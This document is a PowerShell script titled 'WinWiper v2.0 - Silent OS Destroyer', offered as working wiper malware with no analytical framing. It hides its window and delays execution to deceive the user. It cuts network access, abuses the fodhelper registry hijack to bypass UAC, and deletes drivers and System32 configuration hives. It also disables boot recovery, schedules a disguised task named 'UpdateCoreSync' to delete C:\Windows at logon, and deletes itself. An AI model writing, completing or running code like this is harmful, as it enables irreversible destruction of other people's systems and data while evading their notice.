# WinWiper v2.0 - Silent OS Destroyer
# Runs hidden, no UAC prompt, kills network + drivers + boot

# Hide window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$hwnd = (Get-Process -PID $PID).MainWindowHandle
[Console.Window]::ShowWindow($hwnd, 0)

Start-Sleep 120  # Delay 2 mins (user thinks all is fine)

# === PHASE 1: KILL NETWORK ===
netsh advfirewall set allprofiles state on >$null 2>&1
netsh interface set interface "Wi-Fi" disabled >$null 2>&1
netsh interface set interface "Ethernet" disabled >$null 2>&1
ipconfig /release >$null 2>&1

# === PHASE 2: UAC BYPASS (fodhelper) ===
$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\Command"
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c start /min cipher /w:C:\Windows\System32\config" -PropertyType String -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force

Start-Process "fodhelper.exe" -Verb RunAs -WindowStyle Hidden
Start-Sleep 5

# Cleanup reg
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

# === PHASE 3: DELETE DRIVERS & SYSTEM CONFIGS ===
$targets = @(
    "$env:WINDIR\System32\drivers\*net*.sys",
    "$env:WINDIR\System32\drivers\*wifi*.sys",
    "$env:WINDIR\System32\drivers\*wlan*.sys",
    "$env:WINDIR\System32\drivers\*usb*.sys",
    "$env:WINDIR\System32\drivers\*disk*.sys",
    "$env:WINDIR\System32\config\*"
)

foreach ($path in $targets) {
    Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
}

# === PHASE 4: CORRUPT BOOT & SCHEDULE FINAL WIPE ===
bcdedit /set {default} recoveryenabled No >$null 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >$null 2>&1
cipher /w:$env:WINDIR\Boot >$null 2>&1

# Schedule total wipe on next login
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-c Remove-Item C:\Windows\* -Recurse -Force -ErrorAction SilentlyContinue"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask "UpdateCoreSync" -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue

# === PHASE 5: SELF-DELETE ===
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
